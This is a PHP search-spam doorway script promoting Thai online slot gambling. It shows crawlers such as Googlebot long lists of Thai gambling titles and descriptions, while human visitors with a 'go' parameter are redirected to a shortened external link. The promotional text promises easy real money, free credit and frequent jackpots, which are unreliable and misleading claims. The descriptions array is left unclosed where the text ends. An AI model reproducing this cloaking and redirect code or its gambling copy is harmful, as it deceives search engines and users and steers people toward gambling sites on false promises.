<?php include('config.php'); ?>
<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

function isBot() {
    $bots = array(
        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool', 'AhrefsBot'
    );
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    foreach ($bots as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

if (isset($_GET['go']) && !empty($_GET['go'])) {
    $go = strtoupper($_GET['go']);
    $link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
} else {
    $go = 'ทดลองเล่นสล็อต';
    $link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
}

if(isset($_GET['go']) and !isBot() ){
        header('Location: https://t.ly/UFA899F');
    exit; 

}

if(!isset($_GET['go'])) {
         include('./images.php');
    exit; 

}

$titles = [
"สล็อตเว็บตรง เครดิตฟรี คาสิโนออนไลน์อันดับ 1 ของไทย",
"ฟรีสปินรับโบนัสใหญ่กับเกมสล็อตออนไลน์ที่ดีที่สุดในปี 2024",
"เปิดประสบการณ์สล็อตออนไลน์สุดมันส์ ลุ้นรางวัลใหญ่ทุกวัน",
"เปิดประสบการณ์เกมสล็อตออนไลน์สุดมันส์ที่ไม่ควรพลาด",
"สล็อตออนไลน์ที่มาพร้อมกับโบนัสแจ็คพอตใหญ่ทุกวัน",
"เว็บตรง สนุกสนานไปกับเกมสล็อตออนไลน์ โบนัสแตกง่ายทุกวัน",
"เกมสล็อตออนไลน์สุดมันส์ ลุ้นรับโบนัสใหญ่ทุกวันพร้อมแจ็คพอตแตกง่าย",
"สนุกสนานไปกับเกมสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวัน",
"สนุกกับเกมสล็อตออนไลน์แจ็คพอตแตกง่ายทุกวัน",
"สนุกกับเกมสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวัน พร้อมเทคนิคชนะ",
"เว็บตรง 100 สนุกกับเกมสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวัน",
"สนุกสนานไปกับเกมสล็อตออนไลน์ มีเกมใหม่อัพเดททุกวัน รับโบนัสมากมาย",
"เล่นง่ายได้เงินจริง สนุกกับเกมสล็อตออนไลน์ที่ดีที่สุด",
"สนุกสุดมันส์กับเกมสล็อตออนไลน์ ลุ้นรางวัลใหญ่ทุกวัน",
"ค้นพบโลกแห่งการเดิมพัน สนุกสนานกับเกมสล็อตออนไลน์และรับโบนัสมากมาย",
"สนุกสุดมันส์กับเกมสล็อตออนไลน์ เต็มอิ่มทุกการเดิมพัน รับรองความปลอดภัย",
"เล่นสล็อตออนไลน์ได้เงินจริง สนุกกับเกมส์มากมายและโบนัสเพียบ",
"เปิดประสบการณ์เกมสล็อตออนไลน์สุดมันส์ที่ไม่เหมือนใครในไทย",
"เล่นสล็อตออนไลน์ได้เงินจริง เต็มอิ่มกับโบนัสและแจ็คพอตทุกวัน",
"เกมสล็อตออนไลน์มาแรง ลุ้นรับโบนัสใหญ่ทุกวัน",
"สนุกกับเกมสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวัน",
"พาเล่นสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวัน สนุกสุดมันส์ไม่มีหยุด",
"เปิดประสบการณ์เดิมพันสล็อตออนไลน์สุดมันส์พร้อมโบนัสเครดิตฟรี",
"สนุกกับสล็อตออนไลน์ โบนัสเพียบ เล่นง่ายจ่ายจริงได้เงินชัวร์",
"สนุกกับเกมสล็อตออนไลน์ เต็มที่กับโบนัสแจ็คพอตที่คุณไม่ควรพลาด",
"สล็อตออนไลน์เล่นง่ายจ่ายจริงเงินรางวัลแจ็คพอตแตกบ่อยที่สุดในไทย",
"สนุกกับเกมสล็อตออนไลน์ ลุ้นรางวัลใหญ่ทุกวันพร้อมโปรโมชั่นสุดคุ้ม",
"เกมสล็อตออนไลน์มาใหม่ เล่นง่ายได้เงินจริง สมัครเลยรับโบนัสใหญ่",
"สล็อตออนไลน์เล่นง่ายจ่ายจริงเงินรางวัลก้อนโตที่นี่ที่เดียว",
"เล่นสล็อตออนไลน์ได้เงินจริง โบนัสเพียบพร้อมเกมส์มากมาย",
"เล่นสล็อตออนไลน์ได้เงินจริง รับโบนัสแจ็คพอตทุกวันไม่มีหยุด",
"สนุกกับเกมสล็อตออนไลน์ที่ดีที่สุดและโบนัสมากมาย",
"เปิดประสบการณ์เดิมพันสุดมันส์กับเกมสล็อตออนไลน์ที่ดีที่สุด",
"เล่นสล็อตออนไลน์สนุกสุดมันส์ รับโบนัสใหญ่กับเกมส์มากมาย",
"สล็อตออนไลน์เล่นง่ายจ่ายจริงเงินรางวัลแจกไม่อั้นทุกวัน",
"เล่นสล็อตออนไลน์สุดมันส์ รับโบนัสใหญ่ทุกวัน สมัครง่ายได้เงินจริง",
"สนุกกับเกมสล็อตออนไลน์ ที่มีโบนัสแจ็คพอตใหญ่ที่สุด",
"สนุกกับเกมสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวันและเกมมากมาย",
"เล่นเกมสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวัน สนุกสุดมันส์ไม่มีหยุด",
"เปิดประสบการณ์เกมสล็อตออนไลน์สุดมันส์ ลุ้นรางวัลใหญ่ทุกวัน",
"เล่นสล็อตออนไลน์ได้เงินจริง เต็มที่กับโบนัสและแจ็คพอตใหญ่",
"เล่นสล็อตออนไลน์ได้เงินจริง ทำเงินง่ายๆ ตลอด 24 ชั่วโมง",
"กำไรงามกับ สล็อตออนไลน์แจ็คพอตแตกง่ายทุกวัน",
"สนุกไปกับเกมสล็อตออนไลน์ แจ็คพอตแตกง่าย โบนัสเพียบ",
"เล่นสล็อตออนไลน์ได้เงินจริง ลุ้นรับโบนัสใหญ่ทุกวัน",
"เปิดประสบการณ์เกมสล็อตออนไลน์สุดมันส์พร้อมโบนัสใหญ่ไม่อั้น",
"เปิดประสบการณ์เกมสล็อตออนไลน์สุดมันส์พร้อมโบนัสแจ็คพอตใหญ่",
"เล่นสล็อตออนไลน์ได้เงินจริง สมัครง่าย โบนัสเพียบ",
"เล่นสล็อตออนไลน์ได้เงินจริง สนุกสุดมันส์กับเกมหลากหลาย",
"เปิดประสบการณ์สล็อตออนไลน์สุดมันส์พร้อมโบนัสแจ็คพอตใหญ่",
"สนุกไปกับเกมสล็อตออนไลน์ที่มีกราฟิกสวยงามและโบนัสมากมาย",
"สนุกสนานไปกับเกมสล็อตออนไลน์ ที่มีเงินรางวัลใหญ่รอคุณอยู่ที่นี่",
"เล่นสล็อตออนไลน์ได้เงินจริง เพลิดเพลินกับเกมส์มากมายและโบนัสสุดคุ้ม",
"เล่นสล็อตออนไลน์ที่นี่ รับโบนัสใหญ่ โอกาสชนะสูง สนุกได้ทุกวัน",
"สนุกกับเกมสล็อตออนไลน์ เงินรางวัลใหญ่รอคุณอยู่ที่นี่",
"สนุกสนานไปกับเกมสล็อตออนไลน์ โบนัสเพียบพร้อมโปรโมชั่นมากมาย",
"เปิดประสบการณ์เกมสล็อตออนไลน์สุดมันส์ที่สุดในไทย",
"เล่นสล็อตออนไลน์ได้เงินจริง เติมเงินง่าย ถอนไว สมัครฟรี",
"เล่นสล็อตออนไลน์สุดมันส์ รับโบนัสใหญ่ ทำกำไรง่ายจากทุกที่",
"สนุกกับเกมสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวัน พบกับการเดิมพันครบวงจร",
"เปิดโลกแห่งเกมสล็อตออนไลน์ สนุกสนานได้ไม่มีหยุดตลอด 24 ชั่วโมง",
"เล่นสล็อตออนไลน์ได้เงินจริง ทำกำไรง่ายๆ ที่นี่ทุกวัน",
"สนุกไปกับเกมสล็อตออนไลน์ เล่นง่ายได้เงินจริงทุกวัน",
"เกมสล็อตออนไลน์สุดมันส์ ลุ้นรางวัลใหญ่ทุกวันไม่มีหยุด",
"สนุกไปกับเกมสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวัน",
"เล่นสล็อตออนไลน์ได้เงินจริง สมัครง่าย โบนัสเพียบ รับรองความมันส์",
"สนุกสุดมันส์กับเกมสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวัน",
"สล็อตออนไลน์เล่นง่ายได้เงินจริงเพลิดเพลินกับเกมส์มากมายและโบนัสจัดเต็ม",
"สนุกกับเกมสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวัน สมัครเลย",
"เปิดประสบการณ์เกมสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวัน",
"สนุกกับเกมสล็อตออนไลน์ ลุ้นรับโบนัสใหญ่ทุกวันและเงินรางวัลมากมาย",
"เล่นสล็อตออนไลน์ได้เงินจริง โบนัสแตกง่ายทุกวันตลอด 24 ชั่วโมง",
"เปิดประสบการณ์เกมสล็อตออนไลน์สุดมันส์กับโบนัสแตกง่ายทุกวัน",
"สนุกกับเกมสล็อตออนไลน์ โบนัสเพียบ ปลอดภัยและไว้วางใจได้",
"เล่นสล็อตออนไลน์ได้เงินจริง รับโบนัสแจ็คพอตทุกวัน",
"เล่นสล็อตออนไลน์ได้เงินจริง ทำกำไรง่ายๆ ทุกวัน",
"เล่นสล็อตออนไลน์แจ็คพอตแตกง่ายทำเงินได้จริงตลอด 24 ชั่วโมง",
"เปิดประสบการณ์สล็อตออนไลน์สุดมันส์ ลุ้นรับโบนัสใหญ่ทุกวัน",
"เปิดประสบการณ์เกมสล็อตออนไลน์สุดมันส์ ลุ้นรับโบนัสใหญ่ทุกวัน",
"สนุกกับเกมสล็อตออนไลน์ ตื่นเต้นทุกการเดิมพัน รับโบนัสมากมาย",
"พบกับเกมสล็อตออนไลน์ที่ดีที่สุดและโบนัสมากมายที่รอคุณ",
"เล่นสล็อตออนไลน์ได้เงินจริง เพลิดเพลินกับเกมส์มากมายไม่มีเบื่อ",
"เล่นง่ายจ่ายจริง สนุกกับเกมสล็อตออนไลน์และรับโบนัสมากมาย",
"เล่นสล็อตออนไลน์ได้เงินจริง โบนัสเพียบ สมัครง่ายได้ทุกที่",
"เล่นสล็อตออนไลน์ได้เงินจริง พร้อมโบนัสแจ็คพอตมหาศาล",
"สนุกกับเกมสล็อตออนไลน์ เต็มที่กับโบนัสและแจ็คพอตมหาศาล",
"เล่นสล็อตออนไลน์สุดมันส์ รับโบนัสใหญ่ทุกวัน ตื่นเต้นทุกการเดิมพัน",
"เล่นสล็อตออนไลน์สุดมันส์ รับโบนัสใหญ่ ทำเงินได้ทุกวัน",
"สนุกกับเกมสล็อตออนไลน์ โบนัสแตกง่าย ได้เงินจริงทุกวัน",
"เข้าสู่ระบบ สนุกสนานไปกับเกมสล็อตออนไลน์และโปรโมชั่นมากมาย",
"เล่นสล็อตออนไลน์ได้เงินจริง เต็มอิ่มกับโบนัสและแจ็คพอตสุดคุ้ม",
"เล่นสล็อตออนไลน์สุดมันส์ รับโบนัสใหญ่ทุกวัน พร้อมเทคนิคชนะ",
"สล็อตออนไลน์เล่นง่ายได้เงินจริงเต็มอิ่มกับโบนัสแจ็คพอตไม่อั้น",
"สนุกไปกับเกมสล็อตออนไลน์ มั่นคงปลอดภัยได้เงินจริงลุ้นรวยทุกวัน",
"สล็อตออนไลน์เล่นง่ายได้เงินจริงเพลิดเพลินกับเกมส์มากมาย",
"เล่นสล็อตออนไลน์ได้เงินจริง พร้อมโบนัสแจ็คพอตใหญ่ทุกวัน",
"เล่นสล็อตออนไลน์ได้เงินจริง สนุกสนานกับเกมมากมายไม่มีเบื่อ",
"เล่นสล็อตออนไลน์ได้เงินจริง ทำกำไรง่ายๆ ทุกวัน พร้อมโบนัสมากมาย",
"สนุกกับเกมสล็อตออนไลน์ที่มีเงินรางวัลใหญ่ที่สุดในไทย",
"เล่นสล็อตออนไลน์ได้เงินจริง โบนัสเพียบพร้อมโปรโมชั่นสุดคุ้ม",
"เล่นสล็อตออนไลน์ได้เงินจริง ทำกำไรง่าย โบนัสแตกบ่อยที่สุด",
];

$icons = [
  "💯", "🔥","😀", "🎰", "🎲", "🏆", "🤏", "💰", "🎯", "🃏", "🤩", "🥇", "🤑", "👑", "🎮", "🎧", "🔮", "🪙", "🧿", "🪄", "🎤", "🎉", "🥳", "🎟️", "🔔", "🎼", "🎹", "🎷", "🎺", "🎸", "🥁", "🎻", "🎲", "🏀", "⚽", "⚾", "🎾", "🎳", "🏐", "🏓", "🏸", "🥊", "🥋", "🎯", "🎱", "🥌", "🪃", "🥷", "🤼", "🤽", "🏅", "🎖️", "🏵️", "🎗️", "🎫", "🎁", "🎀", "🎏", "🎐", "🎊", "🎎", "🎋", "🎍", "🎋", "🎄", "🎃", "🎆", "🎇", "🎑", "🎈", "💝", "💘", "💖", "💗", "💓", "💞", "💕", "💌", "🧸", "🪅", "🪩", "🧨", "✨", "🎇", "🎆", "🪙", "🎎", "🎏", "🎐", "🎀", "🎁", "🎫", "🎖️", "🏅", "🎯", "🥇", "🤏", "😀", "👾", "👽", "🤖", "🎭", "🎨", "🎥", "📽️", "📷", "📸", "📹", "📺", "📻", "🎚️", "🎛️", "🔊", "📡", "🎢", "🎡", "🎠", "🎪", "🛴", "🚴", "🚵", "🚣", "🏇", "🏂", "🏌️", "⛳", "🏄", "🏊", "🤽", "🏋️", "🤼", "🤸", "⛷️", "🤾", "🧘", "🥋", "🥊", "🛹", "🎿", "🏏", "🏉", "🥏", "🥍", "🎣", "🤿", "🏹", "🛷", "🎖️", "🏆", "🥇", "🥈", "🥉", "🏵️", "🎫", "🎟️", "🎗️", "🎀", "🎁", "🧧", "🎉", "🎊", "🎋", "🎍", "🎏", "🎎", "🎐", "🎑", "🎄", "🎃", "🎆", "🎇", "✨", "🎈", "🎤", "🎧", "🎼", "🎹", "🎷", "🎺", "🎸", "🥁", "🎻", "🎬", "🎙️", "🎥", "📽️", "🎞️", "📷", "📸", "📹", "📺", "📻", "🎚️", "🎛️", "🎙️", "🔊", "🔔", "📡", "🎢", "🎡", "🎠", "🎪", "🎭", "🛴", "🚴", "🚵", "🚣", "🏇", "🏂", "🏌️", "⛳", "🏄", "🏊", "🤽", "🏋️", "🤼", "🤸", "⛷️", "🏋️", "🤾", "🧘", "🏋️", "🤼", "🥋", "🥊", "🛹", "🎿", "🏏", "🏉", "🥏", "🥍", "🎣", "🤿", "🏹", "🛷", "🏅", "🎖️", "🏆", "🥇", "🥈", "🥉", "🏵️", "🎫", "🎟️", "🎗️", "🎀", "🎁", "🧧", "🎉", "🎊", "🎋", "🎍", "🎏", "🎎", "🎐", "🎑", "🎄", "🎃", "🎆", "🎇", "✨", "🎈"
];

$descriptions = [
"อันดับ 1 เว็บสล็อต แท้ 100% รับ ทรูวอเลท ไม่มีขั้นต่ำ รวมเกมส์สล็อตทุกค่ายดัง Pg Slot แตกง่าย ระบบ Slot auto ทันสมัยที่สุดในปี 2024.",
"ทุกค่ายเกม 2024 รวมสล็อตเล่นฟรีทั้งหมด เว็บตรง ไม่เด้ง ซื้อฟีเจอร์ ฟรีสปิน มากกว่า 3000 เกม PGSLOT ลิขสิทธิ์แท้ ต่างประเทศ อัปเดตล่าสุด.",
"ทดลองเล่นสล็อตPG สล็อตออนไลน์ยอดนิยม​ เปิดให้ทดลองเล่นสล็อตได้ฟรีทุกเกม สามารถซื้อฟรีสปินได้ ระบบดี เสถียรภาพ ไม่สะดุด คนเล่นฟรีเยอะที่สุด.",
"ทดลองเล่นสล็อตเว็บนอก มีทางเข้าเล่นครบวงจร ตอบโจทย์ผู้ที่ชื่นชอบ ทดลองเล่นสล็อต เล่นฟรี ไม่เสียค่าใช้จ่าย มีบริการค่ายเกมชั้นนำต่างประเทศทุกค่ายเกม.",
"ไม่ผ่านเอเย่นต์ที่รองรับการทำธุรกรรมผ่านทรูวอเลท มอบความสะดวกสบายในการฝากถอนโดยไม่มีขั้นต่ำ พร้อมทั้งมีเกมที่แตกง่ายทุกเกม อัปเดตเกมใหม่ล่าสุดในปี 2024 เพื่อใ.",
"เป็นหนึ่งในเกมแอคชั่นแจ็คพอตที่ให้เอฟเฟกต์การชนะที่ใหญ่ที่สุดและดีที่สุด ให้การฝากเงินโดยไม่ต้องหักเงินครั้งล่าสุด ลองและสัมผัสประสบการณ์เกมตอนนี้ที่นี่.",
"ที่ให้คุณลุ้นแจ็คพ็อตใหญ่ทุกวัน พร้อมโปรโมชั่นโบนัสพิเศษและระบบฝาก-ถอนที่รวดเร็วและปลอดภัย สมัครตอนนี้เพื่อรับความสนุกและโอกาสทำกำไรสูง!",
"สมัครสมาชิก สล็อต วันนี้ รับเครดิตฟรีทันที เว็บตรง PG Slot แตกง่าย เล่นเกมสล็อตสุดมันส์ พร้อมระบบฝาก-ถอนอัตโนมัติ รวดเร็ว ปลอดภัย 100%!",
"เว็บตรงสล็อต PG ที่มาพร้อมเกมคุณภาพ แจ็คพ็อตแตกง่าย โบนัสและโปรโมชั่นจัดเต็ม รองรับทุกการเล่นด้วยระบบฝาก-ถอนรวดเร็ว สมัครเลยเพื่อรับความสนุกแบบจัดเต็ม!",
"สล็อต สมัครเล่นสล็อตกับ เว็บตรง PG Slot แตกง่าย สมัครง่าย รับเครดิตฟรีทันที เพลิดเพลินกับเกมสล็อตหลากหลาย ระบบฝาก-ถอนออโต้ ลุ้นรางวัลใหญ่ได้ทุกวัน!",
"สล็อต สล็อตเว็บตรง Z16 , H25, 7M PP9 คาสิโนออนไลน์ แทงบอลแบบเฮงๆรวยๆ ฝากถอนไม่มีขั้นต่ำ ด้วยระบบอัตโนมัติ มาพร้อมค่ายเกมมากกว่า 100 ค่าย Thai 100%.",
"เว็บสล็อตออนไลน์ที่ดีที่สุด พบกับเกมสล็อต PG SLOT ครบทุกค่าย เชื่อมต่อ API ต่างประเทศโดยตรง มั่นคง ปลอดภัย 100% พร้อมระบบทดลองเล่นฟรี!",
"คาสิโนเว็บตรง ค่ายใหญ่ เว็บใหม่ล่าสุด ศูนย์รวมเกมคาสิโนออนไลน์ ที่ครบวงจรที่สุดในประเทศไทย มีอัตราการจ่ายเงินรางวัลที่สูงที่สุด รับโปรโมชั่นพิเศษได้ตลอดทั้งวัน.",
"คาสิโน ออนไลน์ เว็บตรงไม่ผ่านเอเย่นต์ รวมค่ายชั้นนำ เว็บพนันออนไลน์ ฝากถอนออโต้ ไม่มีขั้นต่ำ สมัครคาสิโน เล่นได้บนมือถือ สะดวกทุกที่ บริการ 24 ชม.",
"ไม่ผ่านเอเย่นต์ ให้บริการนักพนัน ที่ต้องการเล่นเกม สล็อตออนไลน์ ได้เงินจริง สามารถเข้ามาเล่นบน เว็บสล็อต อันดับ 1 ของเรา.",
"เป็นแหล่งเดิมพันออนไลน์ชั้นนำ มีสล็อตเว็บตรงและสล็อตจากหลากหลายค่าย มั่นใจได้ในความปลอดภัย พร้อมโปรโมชั่นมากมายและบริการอันดีเยี่ยม.",
"แตกง่ายๆมันใจ สล็อตเว็บตรง PG SLOT สล็อต ไม่ผ่านเอเย่นต์ แตกหนัก แตกง่าย เว็บสล็อต ไม่มีขั้นต่ำ ไม่ผ่านเอเย่นต์ วอเลท สล็อตเว็บตรงแท้100%",
"เว็บสล็อตใหม่ล่าสุด ทางเข้าเล่นผ่านหน้าเว็บไม่ต้องดาวน์โหลด ทำเงินง่าย เดิมพันขั้นต่ำ 1 บาท ฝาก-ถอน ออโต้ AUTO ฟรี รองรับ Truewallet อันดับ1 ไม่มีขั้นตํ่า",
"ดีที่สุดในการเดิมพันในปี 2024 สล็อตเว็บตรง เว็บแท้ โปรโมชั่นจัดเต็ม แจกหนักที่สุด สมัครเล่น สล็อตออนไลน์ ได้ที่นี่ เว็บคาสิโนออนไลน์ ไม่ผ่านเอเย่นต์ มาแรง 2024",
"สล็อตเดโม่ฟรี ทดลองเล่นสล็อตไม่มีจำกัด เว็บสล็อตแท้ เกมอัปเดตใหม่ ล่าสุด 2024 เดิมพันไม่มีขั้นตํ่า ทดลองเล่น PPSLOT, PG SLOT, JOKER123, 918KISS SLOT",
"เว็บตรงส็อต ระบบรองรับวอเลทวอเลท สล็อตแตกง่ายที่สุด เบทขั้นต่ำเพียง 1บาท เว็บสล็อตที่มาแรงที่สุด สมัครับเครดิต ทดลองเล่นสล็อตฟรีทันที ไม่ติดเงื่อนไข",
"ให้บริการครบทุกเกม เว็บสล็อตใหม่ล่าสุด ทดลองเล่นรับฟรีสปิน ลุ้นแจ็คพอตทันทีที่หมุน กับระบบเกมใหม่ล่าสุด เพิ่มโอกาสการเเตกของเกมได้ดีมากยิ่งขึ้น",
"เว็บสล็อตใหม่ล่าสุด เว็บตรงไม่ผ่านเอเย่นต์ สล็อตแตกง่าย ไม่มีขึ้นต่ำ สล็อตเว็บใหญ่ ให้บริการเกมเดิมพันแบบครบวงจร สมัครง่าย พร้อมกดรับเครดิตฟรีไม่อั้น",
"สล็อตเว็บแท้ 100% บริการเกมสล็อต ที่ทำรายการผ่านทรูวอเลทได้ เว็บสล็อตทดลองเล่นฟรี ที่ปลอดภัยที่สุดในขณะนี้ สนุกกับการปั่นสล็อต ซื้อฟรีสปินได้ไม่จำกัด",
"เว็บพนันออนไลน์ อันดับ 1 ของประเทศไทย ฝากถอนผ่านระบบออโต้ ไม่มีขั้นต่ำ สล็อตแตกหนัก แตกบ่อยมาก สมัครง่ายไม่มีค่าใช้จ่าย เล่นวันนี้รับโบนัสฟรี 100 %",
"เว็บตรงมาแรง ในปี 2024 เว็บที่มีผู้เล่นมากที่สุดในไทย แจกหนัก แจกบ่อย ถอนได้ไม่อั้น ไม่จำกัด แตกเท่าไรเราก็ถอนให้ทันที การเงินมั่นคง ปลอดภัย มั่นใจได้",
"เว็บใหม่มาแรงที่สุดในไทย ตอนนี้ มีเกมชั้นนำมากมาย อัปเดตเกมอยู่เสมอ ให้ผู้เล่นได้เข้ามาร่วมสนุกและท้าทายไปกับเกมผจญภัยต่างๆ สมัครวันนี้รับฟรีเครดิต",
"เกมสล็อตเว็บตรง ที่มีเกมบริการมากกว่า 2,000เกม ด้วยระบบการ ฝาก-ถอน ด้วยระบบออโต้ เทคนิคการเล่นที่แสนจะง่ายบริการดี พร้อมมีเกมแนะนำอัตราการจ่ายที่สูง",
"เล่นเกมสล็อตกับเว็บเรามีความมั่นคง และ มีเปอร์เซ็นต์ในการจ่ายที่มากกว่าเว็บอื่นๆ โดยมีระบบการเล่นที่ทันสมัย ฝาก-ถอน ด้วยระบบออโต้ ผ่านทาง ทรูวอลเลท",
"บริการสุดพิเศษของทางเว็บของเรา ที่จะให้ผู้เล่นใหม่ทุกคน เล่นฟรีแต่ถอนเงินได้จริง ก่อนลงสู่สนามจริง ผู้เล่นสามารถ ใช้เครดิตฟรีในการเล่นและถอนได้แน่นอน",
"ทดลองเล่นสล็อต เว็บตรงเบอร์1 สายปั่นก็ต้องเว็บเรา ไม่ต้องเสียเงิน และ ไม่ต้องดาวน์โหลด เข้าไปเล่นเกมได้เลย เกมทดลองเล่นอีกมากมายให้ท่านได้เลือกเล่น",
"เว็บไซต์ที่รองรับการทำรายการผ่านระบบ true wallet โดยไม่มีข้อกำหนดขั้นต่ำ และไม่มีการล็อคยูสผู้ใช้งาน แจ็คพอตแตกง่ายแม้ว่าจะเล่นเพียงเกมเดียวก็ตาม",
"แพลตฟอร์มสำหรับการเดิมพัน ด้วยระบบอัตโนมัติที่ช่วยให้ทุกท่านมั่นใจ ว่าทุกการเดิมพันเล่นเกมคาสิโนของท่าน จะสามารถเล่นได้ทั้งวัน ไม่มีปิดกั้นอย่างแน่นอน",
"ความตื่นเต้นในการหมุนวงล้อ กับระบบฝึกเล่นเกมฟรีโดยไม่ต้องลงทุน ไม่ต้องมียูสเซอร์สามารถเข้าเล่นได้ เปิดให้ทดลองเล่นเกมสล็อตทุกค่าย ใช้งานง่ายทุกแพลตฟอร์ม",
"มอบโอกาสดีๆให้ทุกท่าน เข้าใช้บริการกันได้ในทุกแพลตฟอร์ม ด้วยการเข้าถึงฟรีสปินฟรีจากผู้ให้บริการ สามารถเข้ามาสัมผัสประสบการณ์การเล่นเกมได้แบบไม่มีสะดุด",
"วิธีการปั่นสล็อตให้ได้เงิน กับสูตรสล็อตที่แม่นยำมากที่สุด ท่านจะได้เข้ามาใช้งานกับระบบที่ทันสมัยมากที่สุด ทำให้ท่านได้พบกับบริการดีๆ จากทีมงานคุณภาพ",
"เคล็ดลับในการปั่นสล็อตให้ได้เงินง่ายๆ กับแพลตฟอร์มที่ทันสมัยที่สุด มีโบนัสให้คุณ 100% สมัครเข้ามาร่วมเล่นเกมกับเราวันนี้ มีแต่ความคุ้มค่าในทุกรูปแบบ",
"การใช้สูตรสล็อตที่ได้ผลจริง ต้องเข้ามาใช้บริการกับเราเท่านั้น เพราะเราคือแหล่งรวมสูตรเล่นได้เงินจริงได้เงินไว ไว้ทั้งหมด คุณต้องห้ามพลาดที่เข้ามาเล่น",
"คุณจะได้เข้าพบกับประสบการณ์ที่ดี อย่างหาที่ไหนไม่ได้ เราได้รวบความบันเทิงไว้ให้คุณได้ครบวงจรมากที่สุดแล้ว ที่นี่จะทำให้คุณได้เพลิดเพลินกับเกมทันสมัย",
"เล่นด้วยความมั่นใจ ระบบเกมคุณภาพระดับโลก พร้อมทั้งมีคำแนะนำก่อนลงเดิมพัน เป็นเว็บสล็อตค่ายใหญ่ที่สุด พร้อมจะนำเสนอท่านได้มาลองสัมผัส และจ่ายเงินแบบจุกๆ",
"คัดสรรเกมสล็อตค่ายใหญ่ การันตีด้วยใบรับรองที่ มีมาตราฐานในต่างประเทศ พร้อมมีโบนัส ให้ท่านได้เลือกตามใจชอบ กับการบริการแบบลูกค้า VVIP แนะนำ24ชม.",
"แนะนำเว็บตรง ที่มั่นคงที่สุด ไม่มีขั้นต่ำ เล่นง่ายพร้อมเทคนิคการนำเล่น แบบเรียลไทม์ เว็บที่สร้างความเชื่อมั่นให้กับลูกค้า มียูสเซอร์มากกว่า 2 แสนยูส",
"แตกหนักแตกง่าย สล็อตเว็บตรง จากเซิร์ฟหลักแท้ 100% การันตีคว้าเงินรางวัลก้อนโตได้ชัวร์ เว็บสล็อตใหม่ล่าสุด ที่มาพร้อมเทนิคการเล่น ที่ไม่เหมือนใคร",
"เว็บที่มั่นคงที่สุด มีค่ายเกมให้ท่านเลือกเล่น อีกมากมาย และมีโปรแกรมคำนวณ อัตราที่มีโอการชนะ มากที่สุด พร้อมกับมีพนักงานแอดมิน คอยบริการท่านตลอด24ชม.",
"ปั่นสล็อตสุดสนุก สล็อตเว็บตรง ที่กำลังมาแรงและยอดนิยมที่สุดอัตราชนะสูงทุกเกม ไม่ว่าจะเป็นสล็อตอัปเดตใหม่ล่าสุด รวมถึงสล็อตในธีมเกมต่างๆ ที่ล้ำสมัยสุดๆ",
"เว็บสล็อตใหม่ล่าสุด เว็บตรงไม่ผ่านเอเย่นต์ สล็อตแตกง่าย ไม่มีขึ้นต่ำ สล็อตเว็บใหญ่ ให้บริการเกมเดิมพันแบบครบวงจร สมัครง่าย พร้อมกดรับเครดิตฟรีไม่อั้น",
"สล็อตเว็บแท้ 100% บริการเกมสล็อต ที่ทำรายการผ่านทรูวอเลทได้ เว็บสล็อตทดลองเล่นฟรี ที่ปลอดภัยที่สุดในขณะนี้ สนุกกับการปั่นสล็อต ซื้อฟรีสปินได้ไม่จำกัด",
"เว็บพนันออนไลน์ อันดับ 1 ของประเทศไทย ฝากถอนผ่านระบบออโต้ ไม่มีขั้นต่ำ สล็อตแตกหนัก แตกบ่อยมาก สมัครง่ายไม่มีค่าใช้จ่าย เล่นวันนี้รับโบนัสฟรี 100 %",
"เว็บตรงมาแรง ในปี 2024 เว็บที่มีผู้เล่นมากที่สุดในไทย แจกหนัก แจกบ่อย ถอนได้ไม่อั้น ไม่จำกัด แตกเท่าไรเราก็ถอนให้ทันที การเงินมั่นคง ปลอดภัย มั่นใจได้",
"เว็บใหม่มาแรงที่สุดในไทย ตอนนี้ มีเกมชั้นนำมากมาย อัปเดตเกมอยู่เสมอ ให้ผู้เล่นได้เข้ามาร่วมสนุกและท้าทายไปกับเกมผจญภัยต่างๆ สมัครวันนี้รับฟรีเครดิต",
"เกมสล็อตเว็บตรง ที่มีเกมบริการมากกว่า 2,000เกม ด้วยระบบการ ฝาก-ถอน ด้วยระบบออโต้ เทคนิคการเล่นที่แสนจะง่ายบริการดี พร้อมมีเกมแนะนำอัตราการจ่ายที่สูง",
"เล่นเกมสล็อตกับเว็บเรามีความมั่นคง และ มีเปอร์เซ็นต์ในการจ่ายที่มากกว่าเว็บอื่นๆ โดยมีระบบการเล่นที่ทันสมัย ฝาก-ถอน ด้วยระบบออโต้ ผ่านทาง ทรูวอลเลท",
"บริการสุดพิเศษของทางเว็บของเรา ที่จะให้ผู้เล่นใหม่ทุกคน เล่นฟรีแต่ถอนเงินได้จริง ก่อนลงสู่สนามจริง ผู้เล่นสามารถ ใช้เครดิตฟรีในการเล่นและถอนได้แน่นอน",
"ทดลองเล่นสล็อต เว็บตรงเบอร์1 สายปั่นก็ต้องเว็บเรา ไม่ต้องเสียเงิน และ ไม่ต้องดาวน์โหลด เข้าไปเล่นเกมได้เลย เกมทดลองเล่นอีกมากมายให้ท่านได้เลือกเล่น",
